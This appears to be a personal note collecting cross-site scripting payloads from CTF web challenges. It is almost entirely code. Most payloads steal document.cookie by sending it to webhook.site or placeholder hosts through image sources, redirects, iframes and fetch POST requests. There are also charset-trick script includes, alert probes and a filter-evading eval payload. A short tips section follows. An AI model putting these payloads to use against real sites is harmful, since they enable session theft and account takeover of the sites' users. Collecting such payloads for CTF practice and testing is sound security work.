---
title: "XSS Payloads From CTFs (Web)"
category: "web"
subcategory: "xss"
type: "technique"
tags: ["my-notes", "personal", "xss", "eval", "payloads", "ctfs", "web"]
summary: "Personal note: XSS Payloads From CTFs (Web)."
source:
  name: "Personal notes"
origin_path: "Web/XSS Payloads From CTFs.md"
---

```js
<script>document.write('<img src="https://webhook.site/9483fd9d-1d2a-4e49-b682-1075b451a5d8?cookie=' + document.cookie + '" />')</script>
```

```js
<iframe src="javascript:top.location='https://webhook.site/8e8a33bd-5b89-4ae7-8d37-72ebbd7a2844?c='+document.cookie"></iframe>
```

```js
<script>document.location.href='/memo?memo='+document.cookie</script>
```

```js
<img src="a" onerror="alert(1)">
```

```js
<svg onload=document['location']="$webhook/?c="+document['cookie']//
```

```js
<img src=x onerror="this.src='https://myrequestbinurl?cookie=' + document.cookie; this.removeAttribute('onerror');">
```

```json
j:{"message":"<script>window.location='document.cookie(</script>","amountoftimeshonked": "aaa"}
```

```javascript
<script>window.location.href="https://webhook.site/ad801017-1091-450e-b5b4-44a061b52cc9?c="+document.cookie;</script>
```

```javascript
*/=document.location.href="https://webhook.site/ad801017-1091-450e-b5b4-44a061b52cc9?"+document.cookie;/*
```

```javascript
</p><script src="/api/avatar/serioton" charset="ISO-8859-1" />
```

```javascript
<script charset="ISO-8859-1" type="text/javascript" src="/api/avatar/serioton"></script>..
```

```html
<script>alert('Boo!');</script>
```

```html
<script>fetch('[host]')</script>
```

```html
<img src=x onerror="alert('Boo!')">
```

```html
<img src=x onerror="fetch('[HOST]' + document.cookie)" />
```

```js
fetch('https://webhook.site/903c1786-9c5a-468e-8012-8254f94f25a2',{method:'POST',body:document.cookie})
```
### Additional Tips
- Pay attention to the haunted HTML and JavaScript code. The context in which your payload is executed will determine its effectiveness.
- Experiment with different sinister payloads to see how the application responds. Some might be blocked by ancient wards, while others may slip through.
- Use developer tools to test and debug your evil payloads.


```js
<script>this['al'+'ert'](eval('fl'+'ag'))</script>
```

---

*From your own notes: `Web/XSS Payloads From CTFs.md`*
